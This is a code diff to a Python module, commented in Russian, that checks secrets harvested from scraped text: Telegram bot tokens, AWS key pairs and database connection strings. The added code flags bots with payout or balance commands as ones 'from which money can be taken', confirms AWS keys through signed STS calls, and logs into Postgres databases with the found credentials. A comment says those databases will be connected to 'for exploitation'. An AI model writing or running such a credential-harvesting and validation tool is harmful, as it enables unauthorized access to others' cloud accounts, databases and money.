@@ -1,11 +1,12 @@
 # -*- coding: utf-8 -*-
-"""Проверка AI API-ключей: валидность и баланс у провайдеров.
+"""Верификация найденных секретов: AI-ключи, telegram-боты, AWS, DSN.
 
-Использует только бесплатные эндпоинты (список моделей / инфо ключа),
-без списания средств с аккаунта.
+Все проверки бесплатны и безопасны (без списания средств, read-only).
 """
+import asyncio
 import re
 from typing import Any
+from urllib.parse import urlsplit
 
 import aiohttp
 
@@ -114,16 +115,34 @@ def extract_telegram_bots(text: str) -> list[str]:
     return list(dict.fromkeys(m.group(0) for m in TELEGRAM_BOT_RE.finditer(text)))
 
 
+# Платёжные команды telegram-бота (EN/RU)
+MONEY_COMMAND_RE = re.compile(
+    r'(?:pay|payout|withdraw|cash|balance|topup|top_up|deposit|stars|invoice|buy|replenish'
+    r'|вывод|баланс|оплата|пополн|выплат|заработ|кошел)',
+    re.I,
+)
+
+
 async def verify_telegram_bot(
     session: aiohttp.ClientSession,
     token: str,
     proxy: str | None = None,
     timeout_s: float = 5.0,
 ) -> dict[str, Any]:
-    """Проверяет бота через getMe (бесплатно и безопасно)."""
-    result: dict[str, Any] = {"token": token, "status": "error", "username": ""}
+    """Проверяет бота через getMe (бесплатно и безопасно).
+
+    Дополнительно через getMyCommands ищет платёжные команды
+    (вывод/баланс/оплата) - признак бот-кассы, с которой можно брать деньги.
+    """
+    result: dict[str, Any] = {
+        "token": token,
+        "status": "error",
+        "username": "",
+        "money": False,
+        "money_commands": [],
+    }
+    timeout = aiohttp.ClientTimeout(total=timeout_s)
     try:
-        timeout = aiohttp.ClientTimeout(total=timeout_s)
         async with session.get(
             f"https://api.telegram.org/bot{token}/getMe",
             proxy=proxy,
@@ -145,6 +164,215 @@ async def verify_telegram_bot(
             else:
                 result["status"] = "error"
                 result["detail"] = f"HTTP {resp.status}"
+
+        # Живой бот: ищем платёжные команды
+        if result["status"] == "valid":
+            try:
+                async with session.get(
+                    f"https://api.telegram.org/bot{token}/getMyCommands",
+                    proxy=proxy,
+                    timeout=timeout,
+                ) as resp:
+                    if resp.status == 200:
+                        data = await resp.json()
+                        cmds = data.get("result") or []
+                        money = [
+                            c.get("command", "")
+                            for c in cmds
+                            if MONEY_COMMAND_RE.search(str(c.get("command", "")))
+                            or MONEY_COMMAND_RE.search(str(c.get("description", "")))
+                        ]
+                        result["money_commands"] = money
+                        result["money"] = bool(money)
+            except (aiohttp.ClientError, TimeoutError):
+                pass
     except (aiohttp.ClientError, TimeoutError, OSError) as exc:
         result["detail"] = type(exc).__name__
+    return result
+
+
+# AWS access key IDs (AKIA...)
+AWS_KEY_RE = re.compile(r'\b(AKIA[0-9A-Z]{16})\b')
+
+
+def extract_aws_keys(text: str) -> list[str]:
+    """Извлекает AWS access key IDs из текста ответа."""
+    return list(dict.fromkeys(AWS_KEY_RE.findall(text)))
+
+
+# Пары access_key + secret_key в одном JSON-объекте (оба порядка полей)
+AWS_KEYPAIR_RE = re.compile(
+    r'"(?:aws_access_key_id|access_key_id|aws_access_key)"\s*:\s*"(AKIA[0-9A-Z]{16})"'
+    r'[^{}]{0,400}?'
+    r'"(?:aws_secret_access_key|secret_access_key|aws_secret_key)"\s*:\s*"([A-Za-z0-9/+=]{40})"',
+    re.I,
+)
+AWS_KEYPAIR_RE_R = re.compile(
+    r'"(?:aws_secret_access_key|secret_access_key|aws_secret_key)"\s*:\s*"([A-Za-z0-9/+=]{40})"'
+    r'[^{}]{0,400}?'
+    r'"(?:aws_access_key_id|access_key_id|aws_access_key)"\s*:\s*"(AKIA[0-9A-Z]{16})"',
+    re.I,
+)
+
+
+def extract_aws_keypairs(text: str) -> list[tuple[str, str]]:
+    """Извлекает пары (access_key, secret_key) из одного JSON-объекта."""
+    pairs = [(m.group(1), m.group(2)) for m in AWS_KEYPAIR_RE.finditer(text)]
+    pairs += [(m.group(2), m.group(1)) for m in AWS_KEYPAIR_RE_R.finditer(text)]
+    return list(dict.fromkeys(pairs))
+
+
+def _sigv4_auth(
+    access_key: str, secret_key: str, amzdate: str, datestamp: str,
+    body: str,
+) -> str:
+    """Authorization-заголовок SigV4 для POST sts.amazonaws.com (query protocol)."""
+    import hashlib
+    import hmac as hmac_mod
+
+    def h(key: bytes, msg: str) -> bytes:
+        return hmac_mod.new(key, msg.encode(), hashlib.sha256).digest()
+
+    payload_hash = hashlib.sha256(body.encode()).hexdigest()
+    canonical_headers = (
+        'content-type:application/x-www-form-urlencoded\n'
+        'host:sts.amazonaws.com\n'
+        f'x-amz-date:{amzdate}\n'
+    )
+    signed_headers = 'content-type;host;x-amz-date'
+    canonical_request = (
+        f'POST\n/\n\n{canonical_headers}\n{signed_headers}\n{payload_hash}'
+    )
+    scope = f'{datestamp}/us-east-1/sts/aws4_request'
+    string_to_sign = (
+        'AWS4-HMAC-SHA256\n'
+        f'{amzdate}\n{scope}\n'
+        + hashlib.sha256(canonical_request.encode()).hexdigest()
+    )
+    k = h(('AWS4' + secret_key).encode(), datestamp)
+    k = h(k, 'us-east-1')
+    k = h(k, 'sts')
+    k = h(k, 'aws4_request')
+    signature = hmac_mod.new(k, string_to_sign.encode(), hashlib.sha256).hexdigest()
+    return (
+        f'AWS4-HMAC-SHA256 Credential={access_key}/{scope}, '
+        f'SignedHeaders={signed_headers}, Signature={signature}'
+    )
+
+
+async def verify_aws_keypair(
+    session: aiohttp.ClientSession,
+    access_key: str,
+    secret_key: str,
+    proxy: str | None = None,
+    timeout_s: float = 5.0,
+) -> dict[str, Any]:
+    """Проверяет пару AWS-ключей через STS GetCallerIdentity (SigV4).
+
+    Бесплатно и безопасно: только читает identity (account ID, ARN).
+    """
+    result: dict[str, Any] = {
+        "access_key": access_key, "status": "error",
+        "account": "", "arn": "", "detail": "",
+    }
+    try:
+        from datetime import datetime, timezone
+        now = datetime.now(timezone.utc)
+        amzdate = now.strftime('%Y%m%dT%H%M%SZ')
+        datestamp = now.strftime('%Y%m%d')
+        body = 'Action=GetCallerIdentity&Version=2011-06-15'
+        headers = {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-Amz-Date': amzdate,
+            'Authorization': _sigv4_auth(access_key, secret_key, amzdate, datestamp, body),
+        }
+        timeout = aiohttp.ClientTimeout(total=timeout_s)
+        async with session.post(
+            'https://sts.amazonaws.com/', data=body, headers=headers,
+            proxy=proxy, timeout=timeout,
+        ) as resp:
+            if resp.status == 200:
+                text = await resp.text()
+                m = re.search(r'<Account>(\d+)</Account>', text)
+                arn = re.search(r'<Arn>([^<]+)</Arn>', text)
+                if m:
+                    result["status"] = "valid"
+                    result["account"] = m.group(1)
+                    result["arn"] = arn.group(1) if arn else ""
+                else:
+                    result["detail"] = "no account in response"
+            elif resp.status in (400, 401, 403, 404):
+                result["status"] = "invalid"
+                result["detail"] = f"HTTP {resp.status}"
+            else:
+                result["detail"] = f"HTTP {resp.status}"
+    except (aiohttp.ClientError, TimeoutError, OSError) as exc:
+        result["detail"] = type(exc).__name__
+    return result
+
+
+# DSN с кредами: postgres/mysql/mongodb/redis/amqp
+DSN_RE = re.compile(
+    r'\b(?:postgres(?:ql)?|mysql|mariadb|mongodb(?:\+srv)?|redis|amqp)://[^\s"\'<>]+@[^\s"\'<>]+',
+    re.I,
+)
+
+DSN_DEFAULT_PORTS = {
+    "postgresql": 5432, "postgres": 5432,
+    "mysql": 3306, "mariadb": 3306,
+    "mongodb": 27017, "mongodb+srv": 27017,
+    "redis": 6379, "amqp": 5672,
+}
+
+
+def extract_dsns(text: str) -> list[str]:
+    """Извлекает DSN с user:pass@ из текста ответа."""
+    return list(dict.fromkeys(DSN_RE.findall(text)))
+
+
+async def check_dsn(dsn: str, timeout_s: float = 5.0) -> dict[str, Any]:
+    """Проверяет DSN: доступен ли хост, работают ли креды (postgres).
+
+    TCP-коннект идёт напрямую (asyncpg не умеет прокси) - это нормально:
+    к найденной БД всё равно придётся подключаться для эксплуатации.
+    """
+    result: dict[str, Any] = {"dsn": dsn, "status": "unreachable", "error": ""}
+    try:
+        u = urlsplit(dsn)
+        host = u.hostname or ""
+        port = u.port or DSN_DEFAULT_PORTS.get(u.scheme.lower(), 0)
+        if not host or not port:
+            result["error"] = "bad dsn"
+            return result
+
+        try:
+            reader, writer = await asyncio.wait_for(
+                asyncio.open_connection(host, port), timeout=timeout_s
+            )
+            writer.close()
+            await writer.wait_closed()
+        except (OSError, asyncio.TimeoutError) as exc:
+            result["error"] = type(exc).__name__
+            return result
+
+        # Полная проверка кредов - только postgres (asyncpg уже в зависимостях)
+        if u.scheme.lower() in ("postgres", "postgresql") and u.username and u.password:
+            clean_dsn = dsn.split("?", 1)[0]
+            for ssl_arg in (None, False):
+                try:
+                    import asyncpg
+                    conn = await asyncio.wait_for(
+                        asyncpg.connect(dsn=clean_dsn, timeout=timeout_s, ssl=ssl_arg),
+                        timeout=timeout_s + 2,
+                    )
+                    await conn.close()
+                    result["status"] = "auth_ok"
+                    return result
+                except Exception as exc:
+                    result["error"] = type(exc).__name__
+            result["status"] = "reachable"
+        else:
+            result["status"] = "reachable"
+    except Exception as exc:
+        result["error"] = type(exc).__name__
     return result
